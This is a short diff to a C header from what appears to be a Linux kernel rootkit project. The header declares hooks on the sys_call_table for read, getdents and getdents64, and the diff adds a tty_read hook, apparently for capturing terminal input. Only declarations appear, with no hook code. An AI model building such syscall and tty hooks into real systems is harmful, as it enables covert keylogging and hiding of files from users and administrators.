@@ -17,12 +17,14 @@ extern atomic_t read_install_count;
 extern atomic_t getdents_install_count;
 
 extern atomic_t read_count;
+extern atomic_t tty_read_count;
 extern atomic_t getdents_count;
 extern atomic_t getdents64_count;
 
 extern asmlinkage ssize_t (*sys_read)(const struct pt_regs *);
 extern asmlinkage long (*sys_getdents)(const struct pt_regs *);
 extern asmlinkage long (*sys_getdents64)(const struct pt_regs *);
+extern ssize_t (*sys_tty_read)(struct file *, char *, size_t, loff_t *);
 
 int retrieve_sys_call_table(void);
 void init_hooks(void);
@@ -35,5 +37,7 @@ void enable_protection(void);
 asmlinkage ssize_t g7_read(const struct pt_regs *);
 asmlinkage long g7_getdents(const struct pt_regs *);
 asmlinkage long g7_getdents64(const struct pt_regs *);
+ssize_t g7_tty_read(struct file *, char *, size_t, loff_t *);
+
 
 #endif//_GROUP7_HOOK_H
